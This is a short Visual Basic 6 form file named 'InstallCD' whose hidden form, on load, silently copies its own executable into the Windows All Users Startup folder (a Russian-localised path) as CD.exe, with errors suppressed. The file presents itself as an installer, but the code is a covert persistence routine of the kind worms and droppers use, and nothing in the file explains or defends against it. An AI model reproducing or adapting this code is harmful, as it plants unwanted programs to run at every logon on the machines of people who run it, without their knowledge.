VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "InstallCD"
   ClientHeight    =   2265
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   4275
   Icon            =   "avtoInstallopen.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   2265
   ScaleWidth      =   4275
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim toC As String
Dim inC As String

Private Sub Form_Load()

toC = App.Path + "\" + App.EXEName + ".exe"
inC = Left(Environ("windir"), Len(Environ("windir")) - 7) + "Documents and Settings\All Users\Главное меню\Программы\Автозагрузка" + "\CD.exe"
On Error GoTo er:
FileCopy toC, inC
er:
Unload Me
End Sub
